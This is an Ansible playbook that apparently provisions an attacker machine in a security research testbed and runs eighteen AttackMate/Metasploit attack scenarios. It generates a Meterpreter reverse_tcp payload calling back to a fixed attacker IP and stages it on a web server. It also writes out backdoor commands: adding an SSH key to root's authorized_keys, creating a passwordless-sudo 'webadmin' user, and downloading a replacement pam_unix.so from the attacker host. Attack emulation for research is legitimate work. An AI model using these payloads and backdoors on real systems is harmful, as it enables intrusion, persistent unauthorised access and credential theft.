- name: Retstart dnsmasq on inetdns
  hosts: inetdns
  become: true
  tasks:
  - name: stop dnsmasq
    ansible.builtin.service:
      name: dnsmasq
      state: stopped
    tags:
      - playbooks

  - name: start dnsmasq
    ansible.builtin.service:
      name: dnsmasq
      state: started
    tags:
      - playbooks

- name: Install Attacker Host
  hosts: attacker
  become: true
  vars:
    attacker_user: aecid
    attacker_ip: 192.42.1.174
  tasks:
    - name: get user home directory
      ansible.builtin.shell: >
             getent passwd {{ attacker_user }}  | awk -F: '{ print $6 }'
      changed_when: false
      register: user_home
      tags:
        - metasploit
        - zoneminder
        - exploit
        - config
        - install
        - git
        - attackmate
        - playbooks

    - name: Ensure delay of 10 seconds
      ansible.builtin.replace:
        path: /etc/attackmate.yml
        regexp: '^(command_delay:\s*)\d+'
        replace: '\110' 
        backup: yes
      become: true
      tags:
        - playbooks

    - name: Create shellcode for port 3333
      ansible.builtin.shell: >
             msfvenom -p cmd/unix/python/meterpreter/reverse_tcp LHOST=192.42.1.174 LPORT=3333 --platform x64
      changed_when: false
      register: shellcode3333
      tags:
        - metasploit
        - zoneminder
        - exploit
        - config
        - install
        - git
        - attackmate
        - playbooks

    - name: create private ssh key for attacker
      community.crypto.openssh_keypair:
          path: "{{user_home.stdout}}/.ssh/attacker_key"
          owner: "{{ attacker_user }}"
          group: "{{ attacker_user }}"
      register: sshkey
      tags:
          - playbooks

    - name: Create file with add-key-to-root-authorize-command
      ansible.builtin.copy:
              content: |
                "echo {{sshkey.public_key}} >> /root/.ssh/authorized_keys"
              dest: "/var/www/html/README.txt"
              owner: "root"
              mode: "0755"
      tags:
          - scenario_1_a_a
          - scenario_1_b_a
          - playbooks

    - name: Create file with add-key-to-root-authorize-command for pipe
      ansible.builtin.copy:
              content: |
                "echo \"{{sshkey.public_key}}\" >> /root/.ssh/authorized_keys"
              dest: "/var/www/html/README.txt.1"
              owner: "root"
              mode: "0755"
      tags:
          - scenario_1_e_a
          - scenario_1_c_a

    - name: Create file for creating a backdoor user
      ansible.builtin.copy:
              content: |
                "useradd -s /bin/bash -m webadmin; mkdir -p /home/webadmin/.ssh; chown webadmin.webadmin -R /home/webadmin; echo {{sshkey.public_key}} >> /home/webadmin/.ssh/authorized_keys; echo 'webadmin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/webadmin"
              dest: "/var/www/html/README.txt.2"
              owner: "root"
              mode: "0755"
      tags:
          - playbooks

    - name: Create file for creating a backdoor user(alternate)
      ansible.builtin.copy:
              content: |
                "/usr/sbin/useradd -s /bin/bash -m webadmin; mkdir -p /home/webadmin/.ssh; chown webadmin.webadmin -R /home/webadmin; echo {{sshkey.public_key}} >> /home/webadmin/.ssh/authorized_keys; echo 'webadmin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/webadmin"
              dest: "/var/www/html/README.txt.3"
              owner: "root"
              mode: "0755"
      tags:
          - playbooks

    - name: Create file for a libpam backdoor
      ansible.builtin.copy:
              content: |
                      "wget http://{{attacker_ip}}/pam_unix.so; mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so"
              dest: "/var/www/html/README.txt.4"
              owner: "root"
              mode: "0755"
      tags:
          - playbooks

    - name: Create file for a libpam backdoor(alternate)
      ansible.builtin.copy:
              content: |
                      "wget http://{{attacker_ip}}/pam_unix.so; mv pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so"
              dest: "/var/www/html/README.txt.5"
              owner: "root"
              mode: "0755"
      tags:
          - playbooks

    - name: Create file with add-key-to-root-authorize-command
      ansible.builtin.shell:
              cmd: msfvenom -p cmd/unix/python/meterpreter/reverse_tcp LHOST=192.42.1.174 --platform x64 > /var/www/html/TODO.md
              creates: /var/www/html/TODO.md
      tags:
          - playbooks
          - scenario_1_e_a
          - scenario_1_c_a

    - name: Copy playbooks
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.template:
          src: "{{ item }}.j2"
          dest: "{{user_home.stdout}}/{{ item }}.yml"
          mode: '0755'
      loop:
          - scenario_1_a_a
          - scenario_1_b_a
          - scenario_1_f_a
          - scenario_1_e_a
          - scenario_1_c_a
          - scenario_1_d_a
          - scenario_1_a_b
          - scenario_1_b_b
          - scenario_1_c_b
          - scenario_1_d_b
          - scenario_1_e_b
          - scenario_1_f_b
          - scenario_1_a_c
          - scenario_1_b_c
          - scenario_1_c_c
          - scenario_1_d_c
          - scenario_1_e_c
          - scenario_1_f_c
      tags:
         - metasploit
         - attackmate
         - exploit
         - config
         - install
         - playbooks

    - name: "Run Scenario 1 a a"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_a_a.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_a_a
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 b a"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_b_a.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_b_a
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 f a"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_f_a.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_f_a
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 e a"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_e_a.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_e_a
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 c a"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_c_a.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_c_a
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 d a"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_d_a.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_d_a
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 a b"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_a_b.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_a_b
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 b b"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_b_b.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_b_b
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 c b"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_c_b.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_c_b
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 d b"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_d_b.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_d_b
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 e b"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_e_b.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_e_b
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 f b"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_f_b.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_f_b
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 a c"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_a_c.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_a_c
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 b c"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_b_c.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_b_c
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 c c"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_c_c.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_c_c
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 d c"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_d_c.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_d_c
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 e c"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_e_c.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_e_c
         - metasploit
         - attackmate
         - exploit

    - name: "Run Scenario 1 f c"
      become: True
      become_user: "{{attacker_user}}"
      ansible.builtin.shell:
          cmd: "/usr/local/bin/attackmate-tmux scenario_1_f_c.yml --json"
          chdir: "{{user_home.stdout}}"
      tags:
         - scenario_1_f_c
         - metasploit
         - attackmate
         - exploit

